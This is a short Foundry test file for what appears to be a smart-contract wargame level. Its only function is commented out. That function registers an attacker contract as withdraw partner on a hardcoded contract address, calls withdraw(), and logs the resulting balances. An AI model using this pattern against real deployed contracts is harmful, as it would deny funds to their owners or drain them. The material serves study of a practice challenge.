// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Level20} from "../src/Level20.sol";

contract Level20Test is Test {
    address addr = 0x4A809c2d6feF8C00D36c8C7Feb536f0edD170Ee8;

    function setUp() public {}

    // function test_Elevator() public {
    //     console.log(addr.balance, "contract bal before");
    //     console.log(address(0xA9E).balance, "owner bal before");
    //     Level20 bob = new Level20();
    //     (bool a,) = address(addr).call(abi.encodeWithSignature("setWithdrawPartner(address)", bob));
    //     assertTrue(a);
    //     (bool b,) = address(addr).call(abi.encodeWithSignature("withdraw()"));
    //     assertTrue(b);
    //     console.log(addr.balance, "contract bal after");
    //     console.log(address(0xA9E).balance, "owner bal after");
    //     console.log(address(bob).balance, "bob bal");
    // }
}
